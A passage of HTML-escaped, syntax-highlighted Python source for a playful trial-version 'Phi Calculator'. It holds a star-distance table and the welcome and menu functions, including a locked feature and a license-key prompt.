&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Rohan 16&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;57&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;WISH 0855-0714&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;17&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Tiger 007&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;78&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Lalande 21185&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;29&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;UV Ceti&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;58&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Sirius&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;59&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Boss 154&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;69&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Yin Sector CL-Y d127&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;86&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Duamta&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;88&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ross 248&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;37&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;WISE 1506+7027&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;52&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Epsilon Eridani&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;52&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Lacaille 9352&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;69&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Ross 128&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;94&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;EZ Aquarii&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;61 Cygni&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;37&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Procyon&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;41&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Struve 2398&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Groombridge 34&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;73&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Epsilon Indi&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;80&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;SPF-LF 1&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;82&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Tau Ceti&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;94&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;YZ Ceti&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;07&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;WISE 0350-5658&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;09&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Luyten&amp;#39;s Star&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;39&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Teegarden&amp;#39;s Star&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;43&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Kapteyn&amp;#39;s Star&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;76&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Talta&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;83&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Lacaille 8760&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;88
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;intro_trial&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;===============================================&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Welcome to the Phi Calculator, &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;username_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)    
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;This is the trial version of Phi Calculator.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;The full version may be purchased in person near&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;the galactic center of the Milky Way galaxy. &lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Available while supplies last!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;=====================================================&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;menu_trial&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;___Phi Calculator___&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Menu:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;(1) Estimate Projection Burn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;(2) [LOCKED] Estimate  Slingshot Approach Vector&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;(3) Enter License Key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;(4) Exit Phi Calculator&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;What would you like to do, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;username_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; (1&#x2F;2&#x2F;3&#x2F;4)? &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;not &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;validate_choice&lt;&#x2F;span&gt;&lt;span&gt;(choice):
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Invalid choice!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;1&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;estimate_burn&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;2&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;locked_estimate_vector&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;3&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;enter_license&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;4&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span&gt;arcane_loop_trial
&lt;&#x2F;span&gt;&lt;span&gt;        arcane_loop_trial &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;False
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Bye!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;That choice is not valid. Please enter a single, valid &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;\
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;lowercase letter choice (1&#x2F;2&#x2F;3&#x2F;4).&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;validate_choice&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;menu_choice&lt;&#x2F;span&gt;&lt;span&gt;):
